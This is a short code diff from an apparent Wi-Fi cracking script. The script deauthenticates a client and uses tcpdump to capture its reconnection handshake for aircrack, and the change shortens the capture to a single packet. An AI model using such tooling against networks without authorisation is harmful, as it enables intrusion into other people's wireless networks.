@@ -124,10 +124,7 @@ def execute_aircrack(selected_cell, channel_final, worldlist_path='worldlist.txt
             subprocess.run(deauth_command, check=True)
 
             # Capture les paquets de reconnexion avec tcpdump
-            capture_command = [
-    	    'tcpdump', '-i', 'wlan0mon', '-c', '100', '-w', 'reconnect_capture.pcap',
-            f'(ether dst {bssid} and ether src {client_mac})'
-            ]
+            capture_command = ['tcpdump', '-i', 'wlan0mon', '-c', '1', '-w', 'reconnect_capture.pcap',f'(ether dst {bssid} and ether src {client_mac})']
             subprocess.run(capture_command, check=True)
 
             print("Paquet de reconnexion capturé!")
